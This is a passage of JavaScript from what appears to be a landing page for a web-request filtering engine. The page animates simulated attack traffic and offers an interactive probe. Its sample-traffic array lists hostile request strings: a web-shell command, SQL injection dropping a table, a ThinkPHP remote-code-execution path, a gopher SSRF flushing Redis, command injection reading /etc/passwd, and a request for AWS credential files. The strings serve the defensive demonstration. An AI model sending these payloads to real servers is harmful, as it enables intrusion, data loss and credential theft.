  ["GET", "/actuator/env"], ["GET", "/alfa.php"], ["GET", "/shell.php?cmd=id"], ["GET", "/?file=php://filter/convert.base64-encode/resource=index.php"],
  ["GET", "/boaform/admin/formLogin"], ["GET", "/?id=1;DROP%20TABLE%20users--"],
  ["GET", "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"],
  ["GET", "/?u=gopher://127.0.0.1:6379/_FLUSHALL"], ["GET", "/", "sqlmap/1.8.4#stable (https://sqlmap.org)"], ["TRACE", "/"],
  ["GET", "/?cmd=%3Bcat%20%2Fetc%2Fpasswd"], ["GET", "/xmlrpc.php"], ["GET", "/.aws/credentials"], ["GET", "/docker/containers/json"],
];
const FLAG_NAMES = { double: "double-encoded", unicode: "%u escapes", overlong: "overlong UTF-8", nul: "null bytes", backslash: "backslashes", entity: "HTML entities", fold: "look-alike characters" };
// documentation ranges only: nobody real
const fakeIp = () => pick(["203.0.113.", "198.51.100.", "192.0.2."]) + (1 + ((Math.random() * 254) | 0));

async function bulwark() {
  const engineEl = $("#bw-engine");
  let E;
  try {
    const [pl, nm] = await Promise.all([import("./bulwark/payloads.js"), import("./bulwark/normalize.js")]);
    E = { inspect: pl.inspect, cat: pl.categoryById, normalize: nm.normalize };
    // what an unseen URL costs here: unique targets, so nothing comes from the cache
    const run = (n) => { const t0 = performance.now(); for (let i = 0; i < n; i++) E.inspect({ method: "GET", path: `/?id=1%27%20OR%20%271%27%3D%271&_=${i}${Math.random()}`, ua: UA }); return ((performance.now() - t0) / n) * 1000; };
    run(400); // let the JIT warm up first, like a gateway that's been running a while
    const us = run(400);
    engineEl.textContent = `real engine · ≈${us < 10 ? us.toFixed(1) : Math.round(us)} µs per new URL, in your browser`;
    engineEl.classList.add("ok");
  } catch (err) {
    engineEl.textContent = "engine didn't load in this browser";
    return;
  }

  const verdictOf = (r) => r.score === 3 ? ["drop", "DROPPED"] : r.score === 1 ? ["warn", r.probe ? "PROBE" : r.label ? "LABEL" : "SUSPICIOUS"] : ["pass", "THROUGH"];

  // the probe
  const form = $("#probe"), input = $("#probe-path"), method = $("#probe-method");
  const pipe = $$("#pipeline li");
  let animT = [];
  function show(m, path, ua = UA) {
    if (!path.startsWith("/")) path = "/" + path;
    const r = E.inspect({ method: m, path, ua });
    const n = E.normalize(path);
    const [kind, badge] = verdictOf(r);
    animT.forEach(clearTimeout); animT = [];
    pipe.forEach((li) => li.classList.remove("lit"));
    const box = $("#verdict");
    const steps = REDUCED ? 0 : 110;
    pipe.forEach((li, i) => animT.push(setTimeout(() => { li.classList.add("lit"); if (i) pipe[i - 1].classList.remove("lit"); }, i * steps)));
    animT.push(setTimeout(() => {
      pipe.forEach((li) => li.classList.remove("lit"));
      box.className = "verdict flash " + kind;
      $("#v-badge").textContent = badge;
      $("#v-name").textContent = r.name ? r.name[0].toUpperCase() + r.name.slice(1) : "Nothing here but a request";
      $("#v-meter").style.width = Math.min(100, (r.pts / 20) * 100) + "%";
      const facts = [];
      const add = (k, v) => facts.push(h("dt", {}, k), h("dd", {}, v));
      add("points", `${r.pts}${r.score === 3 ? " (5+ is a payload)" : ""}`);
      if (r.cat) { const c = E.cat(r.cat); add("category", h("span", { class: "cat", style: `--cc:${c?.color || "#888"}` }, c?.name || r.cat)); }
      if (r.cves?.length) add("CVE", h("span", { class: "cve" }, r.cves.join(", ")));
      if (r.det) add("why", r.det);
      if (r.hits?.length > 1) add("hits", r.hits.join(" + "));
      const flags = Object.keys(n.flags).filter((f) => FLAG_NAMES[f]);
      const seen = n.path + (n.query ? "?" + n.query : "");
      if (seen !== path) add("decoded", seen.length > 90 ? seen.slice(0, 90) + "…" : seen);
      if (flags.length) add("undid", h("span", {}, ...flags.map((f) => h("span", { class: "flag" }, FLAG_NAMES[f]))));
      if (r.ua && ua !== UA) add("from", "the User-Agent header");
      add("then", kind === "drop" ? "Dropped with a 404. Your app never sees it; the address gets 5 points, and 10 bans it everywhere."
        : r.probe ? "Asking for software that may not be here. It only counts when the app answers 404."
        : r.label ? "A label for the log, never a ban by itself."
        : kind === "warn" ? "Points against the address, but not enough to drop it alone."
        : "Straight through to your app. No false alarm.");
      $("#v-facts").replaceChildren(...facts);
      void box.offsetWidth;
    }, steps * 4));
  }
  form.addEventListener("submit", (e) => { e.preventDefault(); show(method.value, input.value.trim() || "/"); });
  const chips = $("#chips");
  for (const [label, m, p, safe] of CHIPS) {
    chips.append(h("button", { type: "button", class: "chip" + (safe ? " safe" : ""), onclick: () => { method.value = m; input.value = p; show(m, p); } }, label));
  }

  // the feed
  const feed = $("#feed");
  let drop = 0, pass = 0, next = 0;
  const cDrop = $("#fc-drop"), cPass = $("#fc-pass");
  function feedOne() {
    const [m, p, ua] = pick(TRAFFIC);
    const r = E.inspect({ method: m, path: p, ua: ua || UA });
    const [kind] = verdictOf(r);
    if (kind === "drop") drop++; else if (kind === "pass") pass++;
    cDrop.textContent = drop; cPass.textContent = pass;
    const c = r.cat ? E.cat(r.cat) : null;
    const label = kind === "pass" ? "through" : (c?.short || r.cat || "flag") + (kind === "drop" ? " · dropped" : r.probe ? " · probe" : "");
    const li = h("li", { title: ua ? `User-Agent: ${ua}` : p, onclick: () => { method.value = m; input.value = p; show(m, p, ua || UA); } },
      h("span", { class: "m" }, m), h("span", { class: "ip" }, fakeIp()), h("span", { class: "p" }, ua ? `${p}  ua: ${ua}` : p),
      h("span", { class: "r " + kind, style: c ? `--cc:${c.color}` : "" }, label));
    feed.prepend(li);
    while (feed.children.length > 14) feed.lastChild.remove();
  }
  for (let i = 0; i < 9; i++) feedOne();
  show("GET", input.value);
  if (!REDUCED) whileVisible($("#console"), (dt, t) => { if (t > next) { feedOne(); next = t + rand(700, 1500); } });
}

/* ───────────── go ───────────── */
nav();
spotlight();
loom();
typer();
countUp();
magnets();
copyButtons();
cards();
graph();
flow();
reveal();
live();
bulwark();
